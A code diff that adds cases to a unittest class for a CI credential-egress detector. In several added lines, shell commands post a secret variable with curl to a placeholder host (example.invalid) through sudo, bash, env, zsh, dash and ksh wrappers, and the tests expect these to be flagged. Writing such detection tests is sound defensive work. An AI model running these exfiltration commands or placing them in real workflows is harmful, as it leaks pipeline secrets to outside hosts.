@@ -6370,6 +6370,19 @@ class CICredentialEgress(unittest.TestCase):
             '/bin/bash -c \'curl -d "$T" https://example.invalid/x\'',
             'timeout 30 curl -d "$T" https://example.invalid/x',
             'RESP=$(curl -d "$T" https://example.invalid/x)',
+            # the #839 review: a quoted or variable option argument, a shell's -o option, `--` or $'…' after -c,
+            # zsh, dash and ksh, and a wrapper by its path
+            'sudo -u "$RUNNER_USER" curl -d "$T" https://example.invalid/x',
+            'sudo -u $RUNNER_USER curl -d "$T" https://example.invalid/x',
+            'sudo -u \'root\' curl -d "$T" https://example.invalid/x',
+            'bash -o pipefail -c \'curl -d "$T" https://example.invalid/x\'',
+            'bash -eo pipefail -c \'curl -d "$T" https://example.invalid/x\'',
+            'bash -c $\'curl -d "$T" https://example.invalid/x\'',
+            'bash -c -- \'curl -d "$T" https://example.invalid/x\'',
+            '/usr/bin/env bash -c \'curl -d "$T" https://example.invalid/x\'',
+            'zsh -c \'curl -d "$T" https://example.invalid/x\'',
+            'dash -c \'curl -d "$T" https://example.invalid/x\'',
+            'ksh -c \'curl -d "$T" https://example.invalid/x\'',
         )], held=True)
         self.assert_a061([(wf, "run: " + c) for c in (
             'test -n "$T" || echo "curl -d $T https://example.invalid/x"',
@@ -6380,6 +6393,13 @@ class CICredentialEgress(unittest.TestCase):
             'bash -c \'curl -d "status=ok" https://example.invalid/x\'',
             'sh -c \'curl -d "status=ok" https://example.invalid/x\'',
             'RESP=$(curl -H "Authorization: Bearer $T" https://example.invalid/x)',
+            'sudo -u root curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://example.invalid/x',
+            'bash -ec \'curl -d "status=ok" https://example.invalid/x\'',
+            '/bin/bash -c \'curl -d "status=ok" https://example.invalid/x\'',
+            'sudo -u "$RUNNER_USER" curl -d "status=ok" https://example.invalid/x',
+            'bash -o pipefail -c \'curl -d "status=ok" https://example.invalid/x\'',
+            '/usr/bin/env bash -c \'curl -d "status=ok" https://example.invalid/x\'',
+            'zsh -c \'curl -H "Authorization: Bearer $T" https://example.invalid/x\'',
         )], held=False)
 
     def test_environment_dumps_and_encoded_secrets_piped_to_an_upload_are_held(self):
